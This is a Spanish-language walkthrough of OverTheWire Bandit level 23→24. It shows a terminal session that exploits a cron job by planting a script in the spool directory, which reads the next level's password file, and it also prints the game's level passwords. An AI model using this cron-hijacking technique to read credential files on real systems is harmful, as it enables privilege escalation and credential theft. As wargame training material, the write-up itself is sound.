# Bandit Level 23 → Level 24
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
```
ssh bandit23@bandit.labs.overthewire.org -p 2220 
	(comando para iniciar ssh)
contraseña: 
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
## Solución 
```pwd
bandit23@bandit:~$
bandit23@bandit:~$ pwd
/home/bandit23
bandit23@bandit:~$ ls
bandit23@bandit:~$ ls -la
total 20
drwxr-xr-x  2 root root 4096 Apr 23 18:04 .
drwxr-xr-x 70 root root 4096 Apr 23 18:05 ..
-rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root  807 Jan  6  2022 .profile
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:~$ misir /tmp/is
bandit23@bandit:~$ cd /tmp/is
bandit23@bandit:/tmp/is$ echo "cat /etc/bandit_pass/bandit24 > /tmp/is/password" > script.sh
bandit23@bandit:/tmp/is$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/is/password
bandit23@bandit:/tmp/is$ chmod +x script.sh
bandit23@bandit:/tmp/is$ touch password
bandit23@bandit:/tmp/is$ chmod 666 password
bandit23@bandit:/tmp/is$ chmod 777 password
bandit23@bandit:/tmp/is$ ls -la
total 10564
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 133 root     root     10801152 Sep 18 16:25 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 18 16:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:24 script.sh
bandit23@bandit:/tmp/is$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/is$ ls -la
total 10564
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 133 root     root     10801152 Sep 18 16:26 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 18 16:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:24 script.sh
bandit23@bandit:/tmp/is$ date
Mon Sep 18 04:26:41 PM UTC 2023
bandit23@bandit:/tmp/is$ ls -la
total 10564
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 133 root     root     10801152 Sep 18 16:26 ..
-rw-rw-rw-   1 bandit23 bandit23       33 Sep 18 16:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:24 script.sh
bandit23@bandit:/tmp/is$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/is$
```
## Notas adicionales
- "chmod": Es el comando utilizado para cambiar los permisos de archivos y directorios en sistemas Unix y Linux.
    
- "+x": Esta parte del comando significa "agregar permiso de ejecución". El símbolo "+" se utiliza para agregar un permiso, y "x" representa el permiso de ejecución.
    
- "script.sh": Es el nombre del archivo al que se le está otorgando permiso de ejecución.
## Referencias